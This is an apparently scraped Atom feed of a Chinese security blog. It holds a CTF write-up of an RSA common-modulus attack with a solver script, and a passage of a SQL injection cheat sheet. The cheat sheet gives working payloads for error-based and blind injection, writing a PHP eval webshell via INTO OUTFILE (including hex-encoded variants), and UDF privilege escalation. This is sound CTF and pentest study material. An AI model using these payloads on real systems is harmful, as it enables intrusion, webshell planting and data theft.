<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Venture&#39;s Blog</title>
  
  <subtitle>OhiO</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-09-01T16:29:13.613Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Venture</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RSA之共模攻击</title>
    <link href="http://yoursite.com/2018/08/30/RSA/"/>
    <id>http://yoursite.com/2018/08/30/RSA/</id>
    <published>2018-08-29T16:00:00.000Z</published>
    <updated>2018-09-01T16:29:13.613Z</updated>
    
    <content type="html"><![CDATA[<h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>最近巅峰极客线上第二场遇到了RSA的共模攻击，本身不难，但是还是踩了一些坑。。。记录一下</p><p>可攻击的原因在于两个用户使用了相同的模数N，不同的私钥，并加密同一明文消息</p><p>由以上的条件，设明文消息为m,两个用户选择的公钥分别为$ e_i $和$ e_j $,且$ e_i$和$ e_j $互素，对于同一明文m加密有：<br>$$<br>c_i=m^ei(mod\quad N),c_j=m^{e_j}(mod\quad N)<br>$$<br>又因$ e_i $和$ e_j $互素,必存在整数s和t,满足$se_i+te_j=1$, 从而$c_i^sc_j^t=m^{se_i+te_j}=m(mod\quad N)$</p><p>题目直接给到的是两个密文文件，两个公钥文件，这里需要使用openssl查看具体的公钥参数</p><blockquote><p>openssl rsa -pubin -in pubkey1.pem -text -modulus</p><p>提取出N和e</p></blockquote><p>分别提取pubkey1.pem和pubkey2.pem，可以看到N相同，e1=2333,e2=23333</p><p>满足共模攻击条件</p><p>而这里还需要把密文从base64转换成16进制数,可以使用</p><blockquote><p>echo base64编码密文 |openssl base -d |xxd -ps</p></blockquote><p>贴出一个jio本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from libnum import n2s,s2n</div><div class="line">from gmpy2 import invert</div><div class="line"></div><div class="line"># 递归实现欧几里得算法</div><div class="line"></div><div class="line">def egcd(a, b):</div><div class="line">  if a == 0:</div><div class="line">    return (b, 0, 1)</div><div class="line">  else:</div><div class="line">    g, y, x = egcd(b % a, a)</div><div class="line">    return (g, x - (b // a) * y, y)</div><div class="line"></div><div class="line">def main():</div><div class="line">  n = 0x8989A398988456B3FEF4A6AD86DF3C99577F8978048DE5436BEFC30D8D8C94958912AA526FF333B66857306EBB8DE36C2C396A84EFDC5D382502DAA1A3F3B6E97502D2E31C849330F5B4C95257A149A97F5954EAF89341147ADCDD4E950FFF74E30BBE622876B42EEAC86DF4AD9715D05B5604AA8179424C7D9AC46BD6B5F322B2B5728BA148704A25A8EFCC1E7C84EA7E5CE3E01703F04F94A431D9954BD7AE2C7DD6E879B35F8A2D4A5EFBE737257BF99BD9EE66B15AFF233FC77B558A487DA5952FBE2B923DA9C5EB46788C050336B7E36A5ED82D5C1B2AEB0E45BEE405CBE72481DB2568AA829EEAC87D201A5A8FF5EE6F0BE38192AB2839635F6C664217</div><div class="line">  c1 = 0x5d22812766e24ba6eb0b9886c14d06662b477553371d7022c2d16755fdbe1d3694a856a1c4bf81c418b6403731ee02f172311608cc053fa0d2f769cc014e2bd203d6484508a18e7bb20359b230c80c0ba489878b343520633fb53fe9c5e1f93b8303dda33ac8bc05c60c1bcc063baf8aab02f2f9953f723a78b2e4b7d0b8e8716dd12070e7271f0235680c5dabeffe01d540ece06d1da480d40a4e2485ecf382ab299fab6ab70386076eefaca7a0a0bfc59709aeb45608b9128a0812b1df273fa9f59767ce0ea3c9cfaa06b180397159e2ed18cf59a2ec052a76a09a36e71fee7c3deb1cc385d869f5caa858d0cf75eb2bfb9411213c8c81083de2f5fbcc94a7</div><div class="line">  c2 = 0x12bbb3c150174952c2deb95d8dcb31e873b4514202751f71c60afd796361216d13f25d8edf24ff2e514b2b6f985341c1f7bc6be476a265eb24e13e88b89f7e88ecc1f184a458c7d8bce4832a7ec99e0ff5437c10ba895d9be52eae6664884b3d9058be121b023406d50272f32d72f0cd89b77a66a6b9e0eaaeee03a28fe548ccfca74fa3ab3db81ec70937db2153ce565f8267816f764441c757cacf1da8ac09dc5e02cfae3f24cdccee086f00da26fc37651fcba389b52b6430f0f6d89ce72056bf42591ee6572c687e85a4eaa5a941fdddd1f5fac1b6cf710917c679ea2d6cb94b73d970d41ad7091f4532493b4dd098d56c3a2bd719bdc6ce67996f199585</div><div class="line"></div><div class="line">  e1 = 2333</div><div class="line">  e2 = 23333</div><div class="line">  s = egcd(e1, e2)</div><div class="line">  s1 = s[1]</div><div class="line">  s2 = s[2]</div><div class="line"></div><div class="line"># 求模反元素</div><div class="line"></div><div class="line">  if s1&lt;0:</div><div class="line">    s1 = - s1</div><div class="line">    c1 = invert(c1, n)</div><div class="line">  elif s2&lt;0:</div><div class="line">    s2 = - s2</div><div class="line">    c2 = invert(c2, n)</div><div class="line"></div><div class="line">  m = pow(c1,s1,n)*pow(c2,s2,n) % n</div><div class="line">  print n2s(m)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">  main()</div></pre></td></tr></table></figure><p>求模反元素那里，是因为若$s_1$&lt;0,则$c_1^{s_1}==(c_1^{-1})^{-s_1}$</p><h3 id="另一些常用的openssl命令"><a href="#另一些常用的openssl命令" class="headerlink" title="另一些常用的openssl命令"></a>另一些常用的openssl命令</h3><ul><li>解密：</li></ul><blockquote><p>openssl rsautl -decrypt -inkey private.pem -in flag.enc -out flag</p><p>openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.de</p><p>openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.de -oaep </p><p>openssl rsautl -decrypt -in flag.enc-inkey private.key -out flag.de -pkcs</p></blockquote><ul><li>私钥签名:</li></ul><blockquote><p>openssl rsautl -sign -in test -out test.sig-inkey asn1enc.pem</p></blockquote><ul><li>公钥验证:</li></ul><blockquote><p>openssl rsautl -verify -in test.sig -out test.vfy -inkey asn1pub.pem -pubin</p></blockquote><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_module_attack/#_6" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_module_attack/#_6</a></p><p><a href="https://www.cnblogs.com/gwind/p/8013154.html" target="_blank" rel="external">https://www.cnblogs.com/gwind/p/8013154.html</a></p><p><a href="https://blog.csdn.net/like98k/article/details/79352076" target="_blank" rel="external">https://blog.csdn.net/like98k/article/details/79352076</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;共模攻击&quot;&gt;&lt;a href=&quot;#共模攻击&quot; class=&quot;headerlink&quot; title=&quot;共模攻击&quot;&gt;&lt;/a&gt;共模攻击&lt;/h2&gt;&lt;p&gt;最近巅峰极客线上第二场遇到了RSA的共模攻击，本身不难，但是还是踩了一些坑。。。记录一下&lt;/p&gt;
&lt;p&gt;可攻击的原因在于两个
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL注入姿势</title>
    <link href="http://yoursite.com/2018/08/19/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2018/08/19/SQL注入/</id>
    <published>2018-08-19T10:10:01.741Z</published>
    <updated>2018-08-19T10:32:58.155Z</updated>
    
    <content type="html"><![CDATA[<p><strong>收集一些关于SQL注入的姿势，长期更新:D</strong></p><hr><h2 id="关于mysql字段名和保留字冲突的问题"><a href="#关于mysql字段名和保留字冲突的问题" class="headerlink" title="关于mysql字段名和保留字冲突的问题"></a>关于mysql字段名和保留字冲突的问题</h2><p>当mysql的字段名和保留字冲突的时候，sql语句中的字段名需要加上反引号<code>`来加以区别    select \</code>KEY` from test<br>也说明可以用`来绕过空格。</p><h2 id="注入点在limit关键字后面的利用方法"><a href="#注入点在limit关键字后面的利用方法" class="headerlink" title="注入点在limit关键字后面的利用方法"></a>注入点在limit关键字后面的利用方法</h2><p>SQL语句类似下面这样：（此方法仅适用于5.0.0&lt;mysql&lt;5.6.6的版本）</p><blockquote><p>   SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT （注入点）</p></blockquote><p>mysql 5.x 的文档中的 select 的语法</p><pre><code>SELECT[ALL | DISTINCT | DISTINCTROW ]  [HIGH_PRIORITY]  [STRAIGHT_JOIN]  [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]  [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]select_expr [, select_expr ...][FROM table_references[WHERE where_condition][GROUP BY {col_name | expr | position}  [ASC | DESC], ... [WITH ROLLUP]][HAVING where_condition][ORDER BY {col_name | expr | position}  [ASC | DESC], ...][LIMIT {[offset,] row_count | row_count OFFSET offset}][PROCEDURE procedure_name(argument_list)][INTO OUTFILE &apos;file_name&apos; export_options  | INTO DUMPFILE &apos;file_name&apos;  | INTO var_name [, var_name]][FOR UPDATE | LOCK IN SHARE MODE]]</code></pre><p>limit 关键字后面还有 PROCEDURE 和 INTO 关键字，into 关键字可以用来写文件，但这在本文中不重要，这里的重点是 PROCEDURE 关键字.MySQL默认可用的存储过程只有 ANALYSE </p><p>PROCEDURE ANALYSE 通过分析select查询结果对现有的表的每一列给出优化的建议</p><blockquote><p>PROCEDURE ANALYSE的语法如下：<br>SELECT … FROM … WHERE … PROCEDURE ANALYSE([max_elements,[max_memory]])</p></blockquote><p>max_elements （默认值256） analyze查找每一列不同值时所需关注的最大不同值的数量.<br>analyze还用这个值来检查优化的数据类型是否该是ENUM,如果该列的不同值的数量超过了<br>max_elements值ENUM就不做为建议优化的数据类型。<br>max_memory   （默认值8192） analyze查找每一列所有不同值时可能分配的最大的内存数量v</p><p>尝试用这个存储过程</p><pre><code>mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 procedure analyse(1);ERROR 1386 (HY000): Can&apos;t use ORDER clause with this procedure</code></pre><p>ANALYSE支持两个参数</p><pre><code>mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 procedure analyse(1,1);ERROR 1386 (HY000): Can&apos;t use ORDER clause with this procedure</code></pre><p>可以使用报错注入</p><pre><code>mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.53&apos;mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);ERROR 1105 (HY000): XPATH syntax error: &apos;:sql&apos;</code></pre><p>如果不支持报错注入的话，还可以基于时间注入，直接使用sleep不行，需要用BENCHMARK代替<br>    mysql&gt; select username from user where uid&gt;0 order by uid limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p><blockquote><p>order by 子句后可接and和， 后的语句，而limit 后不能</p></blockquote><h2 id="注入时过滤字段名，获取不到字段名"><a href="#注入时过滤字段名，获取不到字段名" class="headerlink" title="注入时过滤字段名，获取不到字段名"></a>注入时过滤字段名，获取不到字段名</h2><p>常见的做法利用union搭配别名子查询，在不知道字段的时候进行注入。</p><pre><code>mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;+---+---+---+---+| 1 | 2 | 3 | 4 |+---+---+---+---+| 1 | 2 | 3 | 4 |+---+---+---+---+1 row in set (0.00 sec)  mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c union select * from user;+---+------+--------+| 1 | 2| 3  |+---+------+--------+| 1 | 2| 3  || 1 | a| 123456 || 2 | mino | 511323 || 3 | b| asd|+---+------+--------+4 rows in set (0.00 sec)mysql&gt; select e.3 from(select * from (select 1)a,(select 2)b,(select 3)c union select * from user)e;+--------+| 3  |+--------+| 3  || 123456 || 511323 || asd|+--------+4 rows in set (0.00 sec)</code></pre><blockquote><p>   <code>mysql&gt; select * from user where uid=1 union select (select e.3 from(select * from (select 1)a,(select 2)b,(select 3)c union</code><br>   <code>select * from user)e limit 1 offset 3)f,(select 1)g,(select 1)h;</code></p></blockquote><pre><code>    +------+----------+----------+| uid  | username | password |+------+----------+----------+| 1| a| 123456   || asd  | 1| 1|+------+----------+----------+2 rows in set (0.00 sec)</code></pre><h2 id="如果waf拦截了information-schema、columns、tables、database、schema等关键字或函数，且限制了union"><a href="#如果waf拦截了information-schema、columns、tables、database、schema等关键字或函数，且限制了union" class="headerlink" title="如果waf拦截了information_schema、columns、tables、database、schema等关键字或函数，且限制了union"></a>如果waf拦截了information_schema、columns、tables、database、schema等关键字或函数，且限制了union</h2><blockquote><p>爆库名</p></blockquote><p>Polygon(ls1, ls2, …)</p><p>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL</p><p>  如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</p><pre><code>mysql&gt; select uid from user where uid=1 and Polygon(uid);ERROR 1367 (22007): Illegal non geometric &apos;`sql`.`user`.`uid`&apos; value found during parsing</code></pre><p>除了Polygon外，其他同样能用来报错获取得到当前表名和字段的还有：</p><pre><code>1.multiPolygon(id)2.multilinestring(id)3.GeometryCollection(id)4.MultiPoint(id)5.linestring(id)</code></pre><p>如果再限制使用payload长度</p><pre><code>mysql&gt; select uid from user where uid=1-a();ERROR 1305 (42000): FUNCTION sql.a does not exist</code></pre><p>原理：一个库中存在不同的系统或自定义函数，如果函数不存在，他就会爆出这个库没有此函数。</p><blockquote><p>爆字段</p></blockquote><pre><code> mysql&gt; select uid from user where uid=1 and (select * from (select * from user as a join user as b)as c);ERROR 1060 (42S21): Duplicate column name &apos;uid&apos;</code></pre><p>原理:在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p><p>同时，可以利用using爆其他字段</p><pre><code>mysql&gt; select uid from user where uid=1 and (select * from (select * from user as a join user as b using(uid))as c);ERROR 1060 (42S21): Duplicate column name &apos;username&apos;mysql&gt; select uid from user where uid=1 and (select * from (select * from user as a join user as b using(uid,username))as c);ERROR 1060 (42S21): Duplicate column name &apos;password&apos;</code></pre><p><strong>参考：<a href="http://www.wupco.cn/?p=4117" target="_blank" rel="external">http://www.wupco.cn/?p=4117</a></strong></p><h2 id="写shell技巧"><a href="#写shell技巧" class="headerlink" title="写shell技巧"></a>写shell技巧</h2><p>Mysql使用十六进制编码字符串替代字符串常量</p><p>在MySQL中，可以使用<code>select into outfile</code>和<code>select into dumpfile</code>命令向文件系统写文件，不能重写已有的文件</p><blockquote><p>outfile  —- 用于导出查询得到的所有数据<br>（注意点：</p><ol><li>INTO OUTFILE不会覆盖文件</li><li>INTO OUTFILE必须是查询语句的最后一句</li><li>路径名是不能编码的，必须使用单引号）</li></ol><p>dumpfile —- 用于导出一条数据，通常写入第二条的时候出错，但第二条内容已被写入文件，允许写二进制文件（INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择<br>当我们在UDF提权的场景是需要上传二进制文件等等用OUTFILE函数是不能成功的）</p><p>load_file—- 读取文件所有内容</p></blockquote><p>windows操作系统的下反斜杠会被忽略，用正斜杆才能创建到对应的目录。</p><pre><code>mysql&gt; select username from user into outfile  &apos;E:/tool/phpstudy/MySQL/123.txt&apos;;Query OK, 3 rows affected (0.00 sec)mysql&gt; select username from user into dumpfile  &apos;E:/tool/phpstudy/MySQL/111.txt&apos;;ERROR 1172 (42000): Result consisted of more than one rowmysql&gt; select load_file(&quot;E:/tool/phpstudy/MySQL/123.txt&quot;);+---------------------------------------------+| load_file(&quot;E:/tool/phpstudy/MySQL/123.txt&quot;) |+---------------------------------------------+| 1234minoa|+---------------------------------------------+1 row in set (0.28 sec)mysql&gt; select load_file(&quot;E:/tool/phpstudy/MySQL/111.txt&quot;);+---------------------------------------------+| load_file(&quot;E:/tool/phpstudy/MySQL/111.txt&quot;) |+---------------------------------------------+| 1234mino                                    |+---------------------------------------------+1 row in set (0.00 sec)</code></pre><p>outfile 采用tab制表符，来区分字段,会转义换行符;dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理</p><p>支持union的时候:</p><pre><code>id=1 union select 1,2,&apos;&lt;?php @eval($_POST[&apos;c&apos;]); ?&gt;’ into outfile ‘/var/www/html/phpinfo.php’%23</code></pre><p>如果有过滤，可以转换成16进制绕过。</p><pre><code>id=1 union select 1,2,0x3c3f70687020406576616c28245f504f53545b2763275d293b203f3e into outfile ‘/var/www/html/phpinfo.php’%23</code></pre><p>如果一句话中空格被过滤掉，可以利用outfile写文件产生的制表符来绕过。</p><pre><code>id=1 union select &apos;&lt;?php&apos;,&apos;@eval($_POST[&apos;c&apos;]);?&gt;&apos;,&apos;3’ into outfile ‘/var/www/html/phpinfo.php’%23</code></pre><p>不支持union的时候:</p><blockquote><p>fields子句：在FIELDS子句中有三个亚子句：TERMINATED BY、 [OPTIONALLY] ENCLOSED BY和ESCAPED BY。如果指定了FIELDS子句，则这三个亚子句中至少要指定一个。</p><p>（1）TERMINATED BY用来指定字段值之间的符号，例如，“TERMINATED BY ‘,’”指定了逗号作为两个字段值之间的标志。</p><p>（2）ENCLOSED BY子句用来指定包裹文件中字符值的符号，例如，“ENCLOSED BY ‘ “ ‘”表示文件中字符值放在双引号之间，若加上关键字OPTIONALLY表示所有的值都放在双引号之间。</p><p>（3）ESCAPED BY子句用来指定转义字符，例如，“ESCAPED BY ‘*‘”将“*”指定为转义字符，取代“\”，如空格将表示为“*N”。</p></blockquote><p>可以利用TERMINATED BY插入一句话，由于它是通过插入分隔符号来getshell的，所以必须查询结果有多个列</p><pre><code>select * from user into outfile &apos;E:/tool/phpstudy/MySQL/555.php&apos; fields terminated by &apos;&lt;?php phpinfo();?&gt;&apos;;Query OK, 3 rows affected (0.28 sec)mysql&gt; select load_file(&quot;E:/tool/phpstudy/MySQL/555.php&quot;);+-----------------------------------------------------------------------------------------------------------------------------------------+| load_file(&quot;E:/tool/phpstudy/MySQL/555.php&quot;) |+-----------------------------------------------------------------------------------------------------------------------------------------+| 1&lt;?php phpinfo();?&gt;a&lt;?php phpinfo();?&gt;1234562&lt;?php phpinfo();?&gt;mino&lt;?php phpinfo();?&gt;5113233&lt;?php phpinfo();?&gt;b&lt;?php phpinfo();?&gt;asd |+-----------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)id=1 or 1=1 into outfile ‘/var/www/html/phpinfo.php’ fields terminated by ‘&lt;?php phpinfo(); ?&gt;’%23</code></pre><p>如在无web脚本 执行 但是有mysql root 执行的环境下 我们就可以 通过<br>into dump 函数导入udf.dll进行提权</p><pre><code>mysql&gt; show variable like &apos;%plugin%&apos;;+----------------+------------------------------------------+|Variable_name   | Value|+----------------+------------------------------------------+| plugin_dir |c:\mysql\mysql server 5.1\lib/plugin  |+----------------+------------------------------------------+</code></pre><p>mysql&gt; select unhex(‘udf.dll hex code’) into dumpfile ‘c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll’;</p><p>mysql&gt; select * from func; #查看是否有人创建过udf 如果有就可以省略</p><p>mysql&gt; create function MyCmd returns string soname ‘’c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll’;</p><p>mysql&gt; select MyCmd(‘whoam’);</p><p>一点小知识点:</p><p>如何获取该udf.dll文件的16进制值(hex)?<br>我们可以本地搭建mysql环境 找个可以用的udf.dll文件 执行下面操作</p><p>mysql&gt; select hex(load_file (‘c:/windows/temp/xxoo.dll’)) into outfile ‘c:/windows/temp/xxoo.txt’;</p><p>如何获取该udf插件的内置 函数?</p><p>通过C32 等16进制编辑器或直接通过记事本打开看关键字 即可。</p><p><strong>参考：<a href="http://www.cnblogs.com/qing123/p/6771858.html" target="_blank" rel="external">http://www.cnblogs.com/qing123/p/6771858.html</a></strong></p><h2 id="基于union查询的盲注"><a href="#基于union查询的盲注" class="headerlink" title="基于union查询的盲注"></a>基于union查询的盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin union distinct select 1,2,0x32 order by 3 desc;</div><div class="line">+-----+-------+----------------------------------+</div><div class="line">| uid | name  | pass                             |</div><div class="line">+-----+-------+----------------------------------+</div><div class="line">|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |</div><div class="line">|   1 | 2     | 2                                |</div><div class="line">+-----+-------+----------------------------------+</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin union distinct select 1,2,0x33 order by 3 desc;</div><div class="line">+-----+-------+----------------------------------+</div><div class="line">| uid | name  | pass                             |</div><div class="line">+-----+-------+----------------------------------+</div><div class="line">|   1 | 2     | 3                                |</div><div class="line">|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |</div><div class="line">+-----+-------+----------------------------------+</div></pre></td></tr></table></figure><p>与盲注大致相同，都是根据ASCII一位一位猜测，这是是利用MySql的字符串排序操作是从前往后一一用ascii码比对的 。我们可以控制后面的那个查询的第三个字段,让它的ASCII值最小开始变化,当查询结果第一条返回的username字段是2的时候,我们就知道这个字符的ascii码减一就是跟数据库中的相等.所以就可以一位一位的猜出来password字段了 </p><p>这样的利用场景在于过滤规则严格，如过滤了括号，导致无法使用函数，过滤了需要查询的字段名</p><p><strong>参考：<a href="http://wonderkun.cc/index.html/?cat=1&amp;paged=7" target="_blank" rel="external">http://wonderkun.cc/index.html/?cat=1&amp;paged=7</a></strong></p><h2 id="注入点在like"><a href="#注入点在like" class="headerlink" title="注入点在like"></a>注入点在like</h2><p>搜索时没顾虑参数的，如keyword=关键字：</p><p>注入的参数为keyword=’ and [查询条件] and ‘%25’=’，即生成语句：</p><p>select * from 表名 where 字段 like ‘%’ and [查询条件] and ‘%’=’%’</p><h2 id="access"><a href="#access" class="headerlink" title="access"></a>access</h2><p>access数据库并不像mysql那样方便，可以拥有information_schema这个包含数据各种数据库，表以及字段信息的“新华字典”。</p><p>虽然有一个msysobjects,但是大多情况下即使管理员也没办法读取其里的信息，因为读取它需要设置权限。</p><p>测试表名 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&apos; and (select Count(*) from form1)&gt;=0 or &apos;%&apos;=&apos;</div><div class="line"></div><div class="line">&apos; and exists(select * from [cqdl]) or &apos;%&apos;=&apos;</div></pre></td></tr></table></figure><p>对于access数据来说，如果不能利用msysobjects的话，我们只能暴力破解表名、字段名了，而这个往往需要一个表名字典、字段名字典。并且不能提权，写shell。</p><h2 id="updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e"><a href="#updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e" class="headerlink" title="updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e"></a>updatexml报错注入为什么需要字符串拼接函数拼接特殊字符，如0x7e</h2><p>updatexml中存在特殊字符、字母时，会出现报错，报错信息为特殊字符、字母及之后的内容 。也就是说如果我们想要查询的数据是数字开头，例如 <strong>123abc</strong> ，那么查询结果只会显示 <strong>abc</strong>。所以我们会看到很多 <strong>updatexml</strong> 注入的 <strong>payload</strong> 是长这样的 <strong>and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</strong> ,在所要查询的数据前面凭借一个特殊符号(这里的 <strong>0x7e</strong> 为符号 <strong>‘~’</strong> )。   </p><p><strong>冷门的字符串处理函数绕过 </strong></p><ul><li><p>MAKE_SET(<em>bits</em>,<em>str1</em>,<em>str2</em>,…)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select make_set(3,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;);</div><div class="line">+-----------------------------+</div><div class="line">| make_set(3,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;) |</div><div class="line">+-----------------------------+</div><div class="line">| a,b                         |</div><div class="line">+-----------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></li></ul><p>返回一个设定值 (一个包含被‘,’号分开的字字符串的字符串) ，由在<em>bits</em> 组中具有相应的比特的字符串组成。<em>str1</em> 对应比特 0, <em>str2</em> 对应比特1,以此类推。<em>str1</em>, <em>str2</em>, …中的 NULL值不会被添加到结果中。 </p><p>bits应将期转为二进制，如，3为，0011,倒过来排序，则为1100,将bits后面的字符串str1,str2等，放置在这个倒过来的二进制排序中，取出值为3对应的字符串，则得到’a,b’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select make_set(1|4,&apos;a&apos;,&apos;b&apos;,NULL,&apos;d&apos;);</div><div class="line">+--------------------------------+</div><div class="line">| make_set(1|4,&apos;a&apos;,&apos;b&apos;,NULL,&apos;d&apos;) |</div><div class="line">+--------------------------------+</div><div class="line">| a                              |</div><div class="line">+--------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>1|4表示进行或运算，为0001 | 0100,得0101，倒过来排序，为1010，’a’,’b’,NULL,’d’得到的是a。null不取，只有1才取对应字符串 </p><p>所以报错注入可以这样用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select updatexml(1,make_set(3,&apos;~&apos;,(select user())),1);</div></pre></td></tr></table></figure><p>还有类似的函数：lpad()、reverse()、repeat()、export_set() <strong>（lpad()、reverse()、repeat()这三个函数使用的前提是所查询的值中，必须至少含有一个特殊字符，否则会漏掉一些数据）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(1,reverse((select user())),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@toor</div><div class="line"></div><div class="line">mysql&gt; select updatexml(1,export_set(1|2,&apos;::&apos;,(select user())),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;::,::,root@localhost,root@localh</div><div class="line">(EXPORT_SET(bits,on,off[,separator[,number_of_bits]]))</div><div class="line">mysql&gt; select updatexml(1,lpad(&apos;@&apos;,30,(select user())),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@localhostroot@localhostr@&apos;</div><div class="line"></div><div class="line">mysql&gt; select updatexml(1,repeat((select user()),2),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@localhostroot@localhost&apos;</div></pre></td></tr></table></figure><p><strong>updatexml报错最多只能显示32位，需要时结合SUBSTR函数来获取数据就行了 </strong></p><p><strong>参考：<a href="https://xz.aliyun.com/t/2160" target="_blank" rel="external">https://xz.aliyun.com/t/2160</a></strong></p><h2 id="OTHERS"><a href="#OTHERS" class="headerlink" title="OTHERS"></a>OTHERS</h2><p>skip-grant-tables这行代码意思就是跳过跳过授权表，即是可以跳过密码验证直接进入数据库</p><p>添加一个不限制IP用户名为test的用户，密码为abc</p><p><code>grant select,insert,update,delete on *.* to &#39;test&#39;@&#39;%&#39; Identified by &quot;abc&quot;;</code></p><p>删除用户test</p><p><code>drop user test@&#39;%&#39;</code></p><p>查看当前用户信息</p><p><code>SELECT User, Host, Password FROM mysql.user</code><br>MYSQL数据库的认证密码有两种方式，MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密，MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询，前者是MYSQL323加密，后者是MYSQLSHA1方式加密。</p><p><strong>DESCRIBE</strong> </p><p>DESCRIBE 更多地用于获取表结构信息</p><p><code>{DESCRIBE | DESC} tbl_name [col_name | wild]</code></p><p>DESCRIBE is a shortcut for SHOW COLUMNS. “SHOW COLUMNS” 语法能提供更多的关于输出列的信息。</p><p><code>SHOW [FULL] COLUMNS {FROM | IN} tbl_name [{FROM | IN} db_name]    [LIKE &#39;pattern&#39; | WHERE expr]</code></p><p>show columns form 表名 from 数据库名或者：show columns from 